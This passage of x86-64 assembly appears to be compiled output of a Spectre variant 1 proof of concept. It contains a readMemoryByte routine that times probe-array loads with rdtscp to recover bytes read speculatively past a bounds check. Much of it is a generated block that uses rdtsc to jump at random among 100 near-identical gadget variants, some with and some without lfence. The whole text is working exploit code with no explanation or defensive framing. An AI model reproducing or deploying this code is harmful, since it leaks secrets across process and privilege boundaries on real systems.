	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 71
.LreadMemoryByte_win8_var71:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 72
.LreadMemoryByte_win8_var72:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 73
.LreadMemoryByte_win8_var73:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 74
.LreadMemoryByte_win8_var74:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 75
.LreadMemoryByte_win8_var75:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 76
.LreadMemoryByte_win8_var76:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 77
.LreadMemoryByte_win8_var77:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 78
.LreadMemoryByte_win8_var78:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 79
.LreadMemoryByte_win8_var79:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 80
.LreadMemoryByte_win8_var80:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 81
.LreadMemoryByte_win8_var81:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 82
.LreadMemoryByte_win8_var82:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 83
.LreadMemoryByte_win8_var83:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 84
.LreadMemoryByte_win8_var84:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 85
.LreadMemoryByte_win8_var85:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 86
.LreadMemoryByte_win8_var86:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 87
.LreadMemoryByte_win8_var87:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 88
.LreadMemoryByte_win8_var88:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 89
.LreadMemoryByte_win8_var89:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 90
.LreadMemoryByte_win8_var90:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 91
.LreadMemoryByte_win8_var91:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 92
.LreadMemoryByte_win8_var92:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 93
.LreadMemoryByte_win8_var93:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 94
.LreadMemoryByte_win8_var94:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 95
.LreadMemoryByte_win8_var95:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 96
.LreadMemoryByte_win8_var96:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 97
.LreadMemoryByte_win8_var97:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 98
.LreadMemoryByte_win8_var98:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 99
.LreadMemoryByte_win8_var99:
	popq	%rax
	lfence
	cmpl	$0, -92(%rbp)
	jns	.L13
	lfence
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win8_continue
.LreadMemoryByte_win8_continue:
	addq	$32, %rsp
	jmp	.L14
.L18:
	movl	-96(%rbp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -84(%rbp)
	movl	-84(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -72(%rbp)
	leaq	-108(%rbp), %rax
	movq	%rax, -32(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-32(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %r12
	movq	-72(%rbp), %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, -108(%rbp)
	leaq	-108(%rbp), %rax
	movq	%rax, -40(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-40(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%r12, %rax
	movq	%rax, %rbx
	movl	%ebx, %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win7_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win7_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win7_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win7_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win7_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win7_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win7_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win7_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win7_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win7_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win7_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win7_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win7_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win7_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win7_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win7_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win7_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win7_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win7_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win7_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win7_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win7_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win7_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win7_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win7_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win7_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win7_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win7_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win7_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win7_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win7_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win7_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win7_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win7_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win7_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win7_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win7_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win7_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win7_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win7_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win7_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win7_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win7_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win7_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win7_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win7_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win7_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win7_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win7_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win7_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win7_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win7_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win7_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win7_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win7_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win7_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win7_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win7_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win7_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win7_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win7_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win7_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win7_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win7_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win7_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win7_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win7_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win7_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win7_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win7_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win7_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win7_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win7_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win7_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win7_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win7_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win7_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win7_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win7_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win7_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win7_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win7_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win7_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win7_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win7_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win7_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win7_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win7_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win7_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win7_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win7_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win7_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win7_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win7_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win7_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win7_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win7_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win7_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win7_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win7_var99
	jmp	.LreadMemoryByte_win7_var0
## Variant 0
.LreadMemoryByte_win7_var0:
	popq	%rax
	cmpl	%eax, -116(%rbp)
	jl	.L17
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 1
.LreadMemoryByte_win7_var1:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 2
.LreadMemoryByte_win7_var2:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 3
.LreadMemoryByte_win7_var3:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 4
.LreadMemoryByte_win7_var4:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 5
.LreadMemoryByte_win7_var5:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 6
.LreadMemoryByte_win7_var6:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 7
.LreadMemoryByte_win7_var7:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 8
.LreadMemoryByte_win7_var8:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 9
.LreadMemoryByte_win7_var9:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 10
.LreadMemoryByte_win7_var10:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 11
.LreadMemoryByte_win7_var11:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 12
.LreadMemoryByte_win7_var12:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 13
.LreadMemoryByte_win7_var13:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 14
.LreadMemoryByte_win7_var14:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 15
.LreadMemoryByte_win7_var15:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 16
.LreadMemoryByte_win7_var16:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 17
.LreadMemoryByte_win7_var17:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 18
.LreadMemoryByte_win7_var18:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 19
.LreadMemoryByte_win7_var19:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 20
.LreadMemoryByte_win7_var20:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 21
.LreadMemoryByte_win7_var21:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 22
.LreadMemoryByte_win7_var22:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 23
.LreadMemoryByte_win7_var23:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 24
.LreadMemoryByte_win7_var24:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 25
.LreadMemoryByte_win7_var25:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 26
.LreadMemoryByte_win7_var26:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 27
.LreadMemoryByte_win7_var27:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 28
.LreadMemoryByte_win7_var28:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 29
.LreadMemoryByte_win7_var29:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 30
.LreadMemoryByte_win7_var30:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 31
.LreadMemoryByte_win7_var31:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 32
.LreadMemoryByte_win7_var32:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 33
.LreadMemoryByte_win7_var33:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 34
.LreadMemoryByte_win7_var34:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 35
.LreadMemoryByte_win7_var35:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 36
.LreadMemoryByte_win7_var36:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 37
.LreadMemoryByte_win7_var37:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 38
.LreadMemoryByte_win7_var38:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 39
.LreadMemoryByte_win7_var39:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 40
.LreadMemoryByte_win7_var40:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 41
.LreadMemoryByte_win7_var41:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 42
.LreadMemoryByte_win7_var42:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 43
.LreadMemoryByte_win7_var43:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 44
.LreadMemoryByte_win7_var44:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 45
.LreadMemoryByte_win7_var45:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 46
.LreadMemoryByte_win7_var46:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 47
.LreadMemoryByte_win7_var47:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 48
.LreadMemoryByte_win7_var48:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 49
.LreadMemoryByte_win7_var49:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 50
.LreadMemoryByte_win7_var50:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 51
.LreadMemoryByte_win7_var51:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 52
.LreadMemoryByte_win7_var52:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 53
.LreadMemoryByte_win7_var53:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 54
.LreadMemoryByte_win7_var54:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 55
.LreadMemoryByte_win7_var55:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 56
.LreadMemoryByte_win7_var56:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 57
.LreadMemoryByte_win7_var57:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 58
.LreadMemoryByte_win7_var58:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 59
.LreadMemoryByte_win7_var59:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 60
.LreadMemoryByte_win7_var60:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 61
.LreadMemoryByte_win7_var61:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win7_continue
## Variant 62
.LreadMemoryByte_win7_var62:
	popq	%rax
	lfence
	cmpl	%eax, -116(%rbp)
	jl	.L17
